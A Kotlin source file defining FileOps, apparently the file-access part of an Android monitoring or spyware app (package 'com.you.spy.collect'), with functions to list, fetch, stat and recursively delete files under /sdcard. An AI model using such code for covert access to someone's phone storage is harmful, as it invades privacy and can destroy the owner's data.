package com.you.spy.collect

import java.io.File

object FileOps {

    private fun resolve(path: String): File {
        val p = path.trim().ifEmpty { "/sdcard" }
        return File(if (p.startsWith("/")) p else "/sdcard/$p")
    }

    fun ls(path: String): String {
        val f = resolve(path)
        if (!f.exists()) return "not found: ${f.absolutePath}"
        if (f.isFile) return "${f.name}  ${f.length()} bytes"
        return f.listFiles()?.sortedBy { it.name }?.joinToString("\n") {
            val tag = if (it.isDirectory) "d" else "-"
            "$tag ${it.length()}\t${it.name}"
        } ?: "empty"
    }

    fun file(path: String): File? = resolve(path).takeIf { it.exists() && it.isFile }

    fun rm(path: String): String {
        val f = resolve(path)
        return if (f.exists() && f.deleteRecursively()) "deleted ${f.absolutePath}" else "failed"
    }

    fun stat(path: String): String {
        val f = resolve(path)
        return "${f.absolutePath}\nexists=${f.exists()} size=${f.length()}\ndir=${f.isDirectory}\nreadable=${f.canRead()}"
    }
}
